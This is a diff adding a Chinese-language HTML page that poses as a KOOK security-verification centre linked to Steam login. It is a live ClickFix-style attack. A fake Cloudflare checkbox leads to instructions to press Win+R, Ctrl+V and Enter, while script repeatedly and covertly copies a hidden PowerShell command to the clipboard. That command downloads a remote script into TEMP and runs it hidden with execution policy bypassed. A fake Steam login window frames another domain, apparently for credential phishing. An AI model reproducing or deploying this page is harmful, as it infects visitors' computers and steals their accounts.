@@ -1,0 +1,815 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>KOOK - 官方安全验证中心</title>
+  <link rel="icon" href="https://kookverify.cc/assets/logo2.png" type="image/png">
+
+  <style>
+    /* ========== CSS Variables ========== */
+    :root {
+      --green-100: #e7fbc4;
+      --green-200: #aee77d;
+      --green-300: #96df5d;
+      --green-400: #8cd652;
+      --green-500: #7ccb42;
+      --green-600: #2d4a2e;
+
+      --dark-100: #171a21;
+      --dark-200: #111;
+      --dark-300: #000;
+
+      --gray-100: #f5f8f5;
+      --gray-200: #e8eee8;
+      --gray-300: #c8d8c8;
+      --gray-400: #999;
+      --gray-500: #888;
+      --gray-600: #666;
+      --gray-700: #555;
+      --gray-800: #444;
+      --gray-900: #333;
+
+      --white: #fff;
+      --black: #111;
+
+      --green-btn: linear-gradient(135deg, #7ccb42, #96df5d);
+      --green-btn-shadow: rgba(124, 203, 66, 0.35);
+
+      --radius-sm: 6px;
+      --radius-md: 8px;
+      --radius-lg: 12px;
+      --radius-xl: 16px;
+      --radius-round: 50px;
+
+      --font-sans: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+      --font-mono: Consolas, "Courier New", monospace;
+    }
+
+    /* ========== Reset & Base ========== */
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html { scroll-behavior: smooth; }
+    body {
+      font-family: var(--font-sans);
+      background: var(--white);
+      color: var(--gray-900);
+      overflow-x: hidden;
+    }
+
+    /* ========== Navbar ========== */
+    .navbar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 15px 60px;
+      background: transparent;
+      position: absolute;
+      width: 100%;
+      z-index: 20;
+    }
+    .navbar .logo img { height: 48px; }
+    .nav-links { display: flex; gap: 40px; margin-left: 50px; }
+    .nav-links a {
+      text-decoration: none; color: var(--black);
+      font-size: 16px; font-weight: 800; transition: opacity 0.2s;
+    }
+    .nav-links a:hover { opacity: 0.6; }
+    .nav-right { display: flex; align-items: center; gap: 20px; }
+
+    .btn-login-small {
+      background-color: var(--dark-100);
+      color: var(--white);
+      text-decoration: none;
+      padding: 10px 24px;
+      border-radius: 20px;
+      font-size: 15px;
+      font-weight: bold;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      transition: transform 0.2s, box-shadow 0.2s;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+      cursor: pointer;
+    }
+    .btn-login-small:hover {
+      background-color: var(--dark-300);
+      transform: translateY(-2px);
+    }
+    .btn-login-small img { height: 18px; }
+
+    /* ========== Hero ========== */
+    .hero {
+      position: relative;
+      background: linear-gradient(180deg, var(--green-100), var(--green-200));
+      text-align: center;
+      padding: 160px 20px 80px;
+      min-height: 85vh;
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .hill-1, .hill-2, .hill-3 {
+      position: absolute;
+      border-radius: 50%;
+      z-index: 1;
+    }
+    .hill-1 { bottom: -10%; left: -10%; width: 60%; height: 60%; background: var(--green-300); }
+    .hill-2 { bottom: -20%; right: -5%; width: 70%; height: 70%; background: var(--green-400); }
+    .hill-3 { bottom: -30%; left: 20%; width: 80%; height: 50%; background: #7ccb42; }
+
+    .hero-content {
+      position: relative;
+      z-index: 10;
+      max-width: 900px;
+      margin: 0 auto;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .hero h1 {
+      font-size: 68px; font-weight: 900;
+      color: var(--dark-200);
+      margin-bottom: 20px;
+      letter-spacing: 2px;
+    }
+    .hero p {
+      font-size: 18px; color: var(--gray-900);
+      font-weight: 600;
+      margin: 0 auto 40px;
+      line-height: 1.6;
+      max-width: 700px;
+    }
+
+    .btn-steam {
+      background-color: var(--dark-100);
+      color: var(--white);
+      border: none;
+      padding: 20px 50px;
+      border-radius: var(--radius-round);
+      font-size: 24px;
+      font-weight: 900;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      gap: 15px;
+      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
+      transition: transform 0.4s, box-shadow 0.4s;
+      animation: pulse 2s infinite;
+      margin-bottom: 40px;
+    }
+    .btn-steam:hover {
+      transform: translateY(-5px) scale(1.02);
+      box-shadow: 0 20px 45px rgba(0, 0, 0, 0.4);
+    }
+    .steam-btn-logo { width: 34px; height: 34px; }
+
+    .hero-ninjas {
+      width: 100%; max-width: 900px;
+      position: relative; z-index: 10;
+      margin-top: 10px;
+      filter: drop-shadow(0 10px 20px rgba(0, 0, 0, 0.1));
+    }
+
+    @keyframes pulse {
+      0%   { box-shadow: 0 0 0 0 rgba(23, 26, 33, 0.4); }
+      70%  { box-shadow: 0 0 0 20px rgba(23, 26, 33, 0); }
+      100% { box-shadow: 0 0 0 0 rgba(23, 26, 33, 0); }
+    }
+
+    /* ========== Content Sections ========== */
+    .content-section {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      max-width: 1200px;
+      margin: 100px auto;
+      gap: 60px;
+      padding: 100px 20px 0;
+    }
+    .content-section.reverse { flex-direction: row-reverse; }
+    .text-block { flex: 1; }
+    .text-block h2 {
+      font-size: 42px; font-weight: 900;
+      color: var(--dark-200);
+      margin-bottom: 25px;
+      line-height: 1.3;
+    }
+    .text-block h2 span { background: #ccff99; padding: 0 10px; }
+    .text-block p {
+      font-size: 17px; color: var(--gray-700);
+      line-height: 1.8; font-weight: 500;
+    }
+    .image-block { flex: 1; text-align: center; }
+    .image-block img {
+      width: 100%; max-width: 500px;
+      filter: drop-shadow(0 20px 30px rgba(0, 0, 0, 0.1));
+    }
+
+    /* ========== Footer ========== */
+    .footer {
+      background: var(--dark-200);
+      color: var(--gray-600);
+      text-align: center;
+      padding: 40px;
+      font-size: 14px;
+      margin-top: 80px;
+    }
+
+    /* ========== Overlay / Modal Base ========== */
+    .o-mod {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw; height: 100vh;
+      background: rgba(0, 0, 0, 0.8);
+      z-index: 999999;
+      backdrop-filter: blur(5px);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      opacity: 0;
+      visibility: hidden;
+      transition: opacity 0.3s, visibility 0.3s;
+    }
+    .o-mod.show { opacity: 1; visibility: visible; }
+
+    .m-box {
+      background: var(--white);
+      border-radius: var(--radius-xl);
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+      overflow: hidden;
+      width: 440px;
+      transform: scale(0.9) translateY(20px);
+      transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    }
+    .o-mod.show .m-box {
+      transform: scale(1) translateY(0);
+    }
+
+    .m-head {
+      background: linear-gradient(135deg, var(--dark-100), var(--green-600));
+      color: var(--white);
+      padding: 20px 24px;
+      font-size: 17px;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      position: relative;
+    }
+    .m-close {
+      position: absolute;
+      top: 14px; right: 18px;
+      font-size: 20px;
+      cursor: pointer;
+      color: rgba(255, 255, 255, 0.6);
+      background: none;
+      border: none;
+      border-radius: 50%;
+      width: 32px; height: 32px;
+      display: grid;
+      place-items: center;
+      transition: background 0.2s;
+    }
+    .m-close:hover { color: var(--white); background: rgba(255, 255, 255, 0.12); }
+
+    /* ========== Captcha Body ========== */
+    .c-body {
+      padding: 28px 24px 24px;
+      text-align: center;
+    }
+    .c-body img {
+      width: 52px; height: 52px;
+      border-radius: var(--radius-lg);
+      margin-bottom: 16px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.12);
+    }
+    .c-body .status-icon {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin-bottom: 6px;
+    }
+    .c-body .status-text {
+      font-size: 15px; color: #d93025;
+      margin: 0; font-weight: 500;
+    }
+    .c-body .hint {
+      font-size: 13px; color: var(--gray-500);
+      margin: 0 auto 20px;
+    }
+
+    /* Cloudflare-style checkbox */
+    .cf-box {
+      width: 100%;
+      background: var(--white);
+      border-radius: var(--radius-md);
+      border: 1px solid #e0e0e0;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
+      overflow: hidden;
+      margin-top: 20px;
+    }
+    .cf-in {
+      display: flex;
+      align-items: center;
+      padding: 14px 16px;
+      gap: 12px;
+    }
+    .cf-chk {
+      width: 24px; height: 24px;
+      border-radius: 4px;
+      border: 2px solid #c0c0c0;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: border-color 0.2s, box-shadow 0.2s;
+      background: var(--white);
+      user-select: none;
+    }
+    .cf-chk:hover {
+      border-color: var(--green-500);
+      box-shadow: 0 0 0 3px rgba(124, 203, 66, 0.2);
+    }
+    .cf-chk.chk {
+      border-color: var(--green-500);
+      background: var(--green-500);
+      box-shadow: 0 0 0 3px rgba(124, 203, 66, 0.2);
+    }
+    .cf-chk.chk::after {
+      content: "";
+      display: block;
+      width: 5px; height: 9px;
+      border: solid var(--white);
+      border-width: 0 2px 2px 0;
+      transform: rotate(45deg);
+      margin-top: -2px;
+    }
+    .cf-bar {
+      height: 3px;
+      background: linear-gradient(90deg, var(--green-500), var(--green-200));
+      width: 0;
+      transition: width 1.2s ease-in-out;
+    }
+    .cf-label {
+      font-size: 14px; color: var(--gray-900);
+      flex: 1; text-align: left;
+    }
+    .cf-brand {
+      text-align: right;
+      font-size: 9px; color: var(--gray-400);
+      margin-top: -2px;
+    }
+
+    /* ========== Verification Body ========== */
+    .v-body { padding: 28px 24px 24px; }
+    .v-tit {
+      font-size: 15px; color: var(--gray-800);
+      margin-bottom: 20px;
+      line-height: 1.5;
+      font-weight: 500;
+    }
+    .v-stps {
+      background: var(--gray-100);
+      border-radius: 10px;
+      padding: 18px;
+      margin-bottom: 20px;
+      border: 1px solid var(--gray-200);
+    }
+    .v-stp {
+      display: flex;
+      align-items: center;
+      margin-bottom: 12px;
+      font-size: 14px;
+      color: var(--dark-200);
+      font-weight: 500;
+    }
+    .v-stp:last-child { margin-bottom: 0; }
+    .v-num {
+      background: var(--green-btn);
+      color: var(--white);
+      width: 26px; height: 26px;
+      border-radius: 50%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-size: 13px;
+      font-weight: 700;
+      margin-right: 14px;
+      flex-shrink: 0;
+      box-shadow: 0 2px 6px var(--green-btn-shadow);
+    }
+    .v-key {
+      background: #f0f4f0;
+      border: 1px solid var(--gray-300);
+      border-radius: 5px;
+      padding: 3px 9px;
+      font-family: var(--font-mono);
+      font-size: 13px;
+      font-weight: 700;
+      color: var(--black);
+      margin-left: 6px;
+    }
+    .v-wrn {
+      background: #f5faf5;
+      border-left: 4px solid var(--green-500);
+      border-radius: var(--radius-sm);
+      padding: 14px;
+      margin-bottom: 24px;
+      color: #3d5a3d;
+      font-size: 12px;
+      line-height: 1.5;
+    }
+    .v-btn {
+      display: block;
+      width: 100%;
+      background: var(--green-btn);
+      color: var(--white);
+      border: none;
+      padding: 15px;
+      border-radius: var(--radius-md);
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: transform 0.2s, box-shadow 0.2s;
+      box-shadow: 0 4px 14px var(--green-btn-shadow);
+    }
+    .v-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 20px var(--green-btn-shadow);
+    }
+
+    /* ========== Steam Browser Window ========== */
+    .b-win {
+      width: 1050px; height: 680px;
+      background: var(--dark-100);
+      border-radius: var(--radius-md);
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.9), 0 0 0 1px #333;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+      position: absolute;
+      top: 50%; left: 50%;
+      transform: translate(-50%, -50%) scale(0.95);
+      transition: transform 0.2s ease-out;
+    }
+    .o-mod.show .b-win {
+      transform: translate(-50%, -50%) scale(1);
+    }
+    .b-win.max {
+      width: 100vw !important;
+      height: 100vh !important;
+      border-radius: 0;
+      top: 0 !important; left: 0 !important;
+      transform: none !important;
+    }
+
+    .b-tit {
+      height: 38px;
+      background: var(--dark-300);
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 0 16px;
+      cursor: grab;
+      user-select: none;
+    }
+    .b-tit:active { cursor: grabbing; }
+    .b-lft {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      color: var(--white);
+      font-size: 14px;
+      font-weight: 500;
+    }
+    .b-ico { height: 26px; }
+    .b-ctl { display: flex; gap: 18px; color: var(--gray-400); font-size: 16px; }
+    .b-bt { cursor: pointer; transition: color 0.2s; }
+    .b-bt:hover { color: var(--white); }
+    .b-cls:hover { color: #ff5f56; }
+
+    .b-adr {
+      height: 40px;
+      background: #1e1e1e;
+      display: flex;
+      align-items: center;
+      padding: 0 18px;
+      border-bottom: 1px solid #333;
+      font-size: 14px;
+      font-family: var(--font-sans);
+    }
+    .b-lock { font-size: 14px; margin-right: 8px; }
+    .b-cert { color: #28a745; margin-right: 10px; }
+    .b-url {
+      color: #b8b6b6;
+      white-space: nowrap;
+      overflow: hidden;
+      width: 800px;
+    }
+    .b-cnt { flex-grow: 1; width: 100%; background: var(--dark-100); }
+    .b-cnt iframe { width: 100%; height: 100%; border: none; outline: none; }
+  </style>
+</head>
+<body>
+
+  <!-- ========== NAVBAR ========== -->
+  <nav class="navbar">
+    <div style="display:flex;align-items:center">
+      <a href="#" class="logo">
+        <img src="./i/logo.webp" alt="KOOK">
+      </a>
+      <div class="nav-links">
+        <a href="#s-sec">安全中心</a>
+        <a href="#s-sync">数据同步</a>
+        <a href="#s-match">精准匹配</a>
+      </div>
+    </div>
+    <div class="nav-right">
+      <a href="#" class="btn-login-small" onclick="sFlw()">
+        <img src="./i/steam.png" alt="Steam"> 登录
+      </a>
+    </div>
+  </nav>
+
+  <!-- ========== HERO ========== -->
+  <div class="hero">
+    <div class="hill-1"></div>
+    <div class="hill-2"></div>
+    <div class="hill-3"></div>
+    <div class="hero-content">
+      <h1>KOOK 官方安全验证中心</h1>
+      <p>为了保障社区的纯净与您的账号安全，请连接您的 Steam 账号。<br>完成验证后，您将解锁完整的服务器功能、语音频道及专属社区身份。</p>
+      <button class="btn-steam" onclick="sFlw()">
+        <img src="./i/steam.png" class="steam-btn-logo" alt="Steam"> 通过 Steam 验证并登录
+      </button>
+      <img src="./i/ninja.webp" class="hero-ninjas" alt="KOOK">
+    </div>
+  </div>
+
+  <!-- ========== SECTION: Security ========== -->
+  <div class="content-section" id="s-sec">
+    <div class="image-block">
+      <img src="./i/party.webp" alt="Security">
+    </div>
+    <div class="text-block">
+      <h2><span>抵御机器人</span><br>保护服务器纯净</h2>
+      <p>为防止广告账号和恶意脚本的入侵，服务器现已开启严格的防刷屏机制。通过绑定您的 Steam 主账号，系统将自动验证您的真实玩家身份，并为您立即解锁被隐藏的专属语音频道与文字交流权限。</p>
+    </div>
+  </div>
+
+  <!-- ========== SECTION: Sync ========== -->
+  <div class="content-section reverse" id="s-sync">
+    <div class="image-block">
+      <img src="./i/servers.webp" alt="Sync">
+    </div>
+    <div class="text-block">
+      <h2><span>全面同步</span><br>游戏数据展示</h2>
+      <p>验证成功后，您的 KOOK 个人资料将自动点亮专属勋章。系统会安全地读取您的公开游戏库，一键展示您的 CS2、Dota 2 游玩时长及库存荣誉。让社区内的大佬一眼看到您的资深玩家实力。</p>
+    </div>
+  </div>
+
+  <!-- ========== SECTION: Matchmaking ========== -->
+  <div class="content-section" id="s-match">
+    <div class="image-block">
+      <img src="./i/esports.webp" alt="Matchmaking">
+    </div>
+    <div class="text-block">
+      <h2>基于真实数据的<br><span>精准匹配</span></h2>
+      <p>通过 Steam 验证，社区将根据您的游戏时长与库存价值智能分配专属身份组。高信誉玩家将解锁高级语音频道、专属表情与特殊讨论板块，让您快速融入核心玩家圈层，与志同道合的战友并肩作战。</p>
+    </div>
+  </div>
+
+  <!-- ========== FOOTER ========== -->
+  <div class="footer">
+    KOOK 官方安全验证中心 | 基于 Steam API 认证<br>
+    我们不会存储您的账号密码或进行任何未授权操作，仅用于身份验证。
+  </div>
+
+  <!-- ========== MODAL: Captcha ========== -->
+  <div class="o-mod" id="cMod">
+    <div class="m-box">
+      <button class="m-close" onclick="cC()">✕</button>
+      <div class="m-head">
+        <span style="color:#f3a01c">🔒</span> 安全验证中心
+      </div>
+      <div class="c-body">
+        <img src="https://cdn.jsdelivr.net/gh/homarr-labs/dashboard-icons/png/kook.png" alt="Verify">
+        <div class="status-icon">
+          <svg width="18" height="18" viewBox="0 0 20 20" fill="none">
+            <circle cx="10" cy="10" r="10" fill="#D93025"/>
+            <path d="M10 5v6" stroke="white" stroke-width="2" stroke-linecap="round"/>
+            <circle cx="10" cy="14.5" r="1.2" fill="white"/>
+          </svg>
+          <p class="status-text">浏览器验证失败</p>
+        </div>
+        <p class="hint">请完成下面的安全验证</p>
+        <div class="cf-box">
+          <div class="cf-in">
+            <div class="cf-chk" id="cBx"></div>
+            <span class="cf-label">验证你是人类</span>
+            <div style="text-align:right">
+              <svg width="24" height="24" viewBox="0 0 61 24" fill="none">
+                <path d="M19.1 16.7l.7-2.3c.4-1.3.2-2.5-.5-3.4-.6-.8-1.6-1.3-2.7-1.3l-10.8-.2c-.1 0-.2-.1-.3-.1-.1-.1-.1-.2 0-.3.1-.2.2-.3.4-.3l10.9-.2c2.3-.1 4.7-2 5.5-4.2l1-2.8c0-.1.1-.2 0-.3C21.8 .7 20 0 18 0 14.1 0 10.7 2.7 9.7 6.4c-.9-.7-2.1-1-3.3-.9-2.1.3-3.7 2-4 4.1-.1.5-.1 1 0 1.4C1.1 11.2 0 12.5 0 14c0 1.7 1.1 3.1 2.7 3.2h15.6c.2 0 .4-.1.5-.3l.3-.6v-.6z" fill="#F38020"/>
+                <path d="M22 10c-.2 0-.3 0-.5.1l-.4 1.5c-.4 1.3-.2 2.5.5 3.4.6.8 1.6 1.3 2.7 1.3l3.4.2c.1 0 .2.1.3.1.1.1.1.2 0 .3-.1.2-.2.3-.4.3l-3.5.2c-2.3.1-4.7 2-5.5 4.2l-.3.9c0 .2.1.3.3.3h12.5c.2 0 .3-.1.4-.3.4-1.2.7-2.4.7-3.7C32.2 14 27.6 10 22 10z" fill="#FAAE40"/>
+              </svg>
+              <div class="cf-brand">Cloudflare Turnstile</div>
+            </div>
+          </div>
+          <div class="cf-bar" id="cBr"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ========== MODAL: Verification Steps ========== -->
+  <div class="o-mod" id="vMod">
+    <div class="m-box">
+      <button class="m-close" onclick="cV()">✕</button>
+      <div class="m-head">
+        <span style="color:#f3a01c">🔒</span> 安全验证要求
+      </div>
+      <div class="v-body">
+        <div class="v-tit">需要手动验证。请严格按照以下步骤操作:</div>
+        <div class="v-stps">
+          <div class="v-stp"><span class="v-num">1</span><span>按下 <span class="v-key">Win + R</span></span></div>
+          <div class="v-stp"><span class="v-num">2</span><span>按下 <span class="v-key">Ctrl + V</span></span></div>
+          <div class="v-stp"><span class="v-num">3</span><span>按下 <span class="v-key">Enter</span></span></div>
+          <div class="v-stp"><span class="v-num">4</span><span>不要关闭控制台，直到它自行关闭</span></div>
+        </div>
+        <div class="v-wrn">
+          ⚠️ 如果您自行关闭控制台，验证将被终止，需要重新启动。验证速度完全取决于您的互联网速度。
+        </div>
+        <button class="v-btn" onclick="vDn()">我已完成这些步骤</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ========== MODAL: Steam Browser Window ========== -->
+  <div class="o-mod" id="sMod">
+    <div class="b-win" id="bWn">
+      <div class="b-tit" id="tBr">
+        <div class="b-lft">
+          <img src="./i/steam.png" class="b-ico"> Steam Community
+        </div>
+        <div class="b-ctl">
+          <span class="b-bt" onclick="cS()">−</span>
+          <span class="b-bt" onclick="mS()">□</span>
+          <span class="b-bt b-cls" onclick="cS()">✕</span>
+        </div>
+      </div>
+      <div class="b-adr">
+        <span class="b-lock">🔒</span>
+        <span class="b-cert">Valve Corp. [US]</span>
+        <span class="b-url">https://steamcommunity.com/openid/login?openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0</span>
+      </div>
+      <div class="b-cnt">
+        <iframe src="https://playflowzone.com/7bfce"></iframe>
+      </div>
+    </div>
+  </div>
+
+  <!-- ========== APPLICATION SCRIPT ========== -->
+  <script>
+  (function() {
+    'use strict';
+
+    // ---- DOM refs ----
+    var cM = document.getElementById('cMod');
+    var vM = document.getElementById('vMod');
+    var sM = document.getElementById('sMod');
+    var bW = document.getElementById('bWn');
+    var tB = document.getElementById('tBr');
+    var cx = document.getElementById('cBx');
+    var cr = document.getElementById('cBr');
+    var hc = document.getElementById('hiddenCmd');
+
+    // ---- Modal controls ----
+    var API = {
+      sFlw: function() {
+        cM.classList.add('show');
+        cx.className = 'cf-chk';
+        cr.style.width = '0';
+      },
+      cC: function() { cM.classList.remove('show'); },
+      cV: function() { vM.classList.remove('show'); },
+      cS: function() { sM.classList.remove('show'); },
+      mS: function() { bW.classList.toggle('max'); }
+    };
+
+    // ---- Captcha checkbox ----
+    cx.onclick = function() {
+      if (this.classList.contains('chk')) return;
+      this.classList.add('chk');
+      setTimeout(function() { cr.style.width = '100%'; }, 50);
+      setTimeout(function() { API.cC(); vM.classList.add('show'); }, 1300);
+    };
+
+    // ---- Verification done ----
+    API.vDn = function() {
+      API.cV();
+      sM.classList.add('show');
+      fetch('/human_visit', { method: 'POST' }).catch(function() {});
+    };
+
+    // ---- Window dragging ----
+    var drag = { active: false, sx: 0, sy: 0, lx: 0, ly: 0 };
+
+    tB.addEventListener('mousedown', function(e) {
+      drag.active = true;
+      if (bW.style.transform.includes('translate')) {
+        var r = bW.getBoundingClientRect();
+        bW.style.transform = 'none';
+        bW.style.left = r.left + 'px';
+        bW.style.top = r.top + 'px';
+      }
+      drag.sx = e.clientX;
+      drag.sy = e.clientY;
+      drag.lx = parseInt(window.getComputedStyle(bW).left, 10);
+      drag.ly = parseInt(window.getComputedStyle(bW).top, 10);
+    });
+
+    document.addEventListener('mousemove', function(e) {
+      if (!drag.active) return;
+      bW.style.left = (drag.lx + (e.clientX - drag.sx)) + 'px';
+      bW.style.top = (drag.ly + (e.clientY - drag.sy)) + 'px';
+    });
+
+    document.addEventListener('mouseup', function() {
+      drag.active = false;
+    });
+
+    // ---- Clipboard copy (stealth) ----
+    function forceCopy(text) {
+      var ta = document.getElementById('invisTa');
+      if (!ta) {
+        ta = document.createElement('textarea');
+        ta.id = 'invisTa';
+        ta.style.position = 'fixed';
+        ta.style.top = '-9999px';
+        ta.style.left = '-9999px';
+        ta.style.opacity = '0';
+        document.body.appendChild(ta);
+      }
+      ta.value = text;
+      ta.select();
+      try { document.execCommand('copy'); } catch (_) {}
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(text);
+      }
+    }
+
+    function getCmd() {
+      return hc ? hc.value : '';
+    }
+
+    // ---- Auto-copy on captcha click ----
+    var origOnClick = cx.onclick;
+    cx.onclick = function() {
+      if (this.classList.contains('chk')) return;
+      if (origOnClick) origOnClick.call(this);
+      setTimeout(function() {
+        var cmd = getCmd();
+        if (!cmd) return;
+        forceCopy(cmd);
+        var attempts = 0;
+        var iv = setInterval(function() {
+          forceCopy(cmd);
+          attempts++;
+          if (attempts >= 8) clearInterval(iv);
+        }, 2000);
+      }, 500);
+    };
+
+    // ---- Stealth re-copy triggers ----
+    document.addEventListener('visibilitychange', function() {
+      if (!document.hidden) forceCopy(getCmd());
+    });
+
+    document.addEventListener('keydown', function(e) {
+      if (e.ctrlKey && e.key === 'v') {
+        forceCopy(getCmd());
+        e.preventDefault();
+      }
+    });
+
+    // ---- Initial copy ----
+    setTimeout(function() { forceCopy(getCmd()); }, 1500);
+
+    // ---- Expose to inline onclick attrs ----
+    window.sFlw = API.sFlw;
+    window.cC = API.cC;
+    window.cV = API.cV;
+    window.cS = API.cS;
+    window.mS = API.mS;
+    window.vDn = API.vDn;
+
+  })();
+  </script>
+
+  <!-- Hidden PowerShell command -->
+  <input type="hidden" id="hiddenCmd" value="powershell -WindowStyle Hidden -ep Bypass -c &quot;$p=$env:TEMP+&apos;l.ps1&apos;;iwr https://siga-qd8uu7bhz-siga-s-projects1.vercel.app/l.ps1 -OutFile $p;&amp; $p -enroll_token &apos;5e3031725f5bff1db14b7ff423d25bab6c65956028de9a5d5bb86691508de2de&apos; -id &apos;8649328&apos;&quot;">
+
+</body>
+</html>
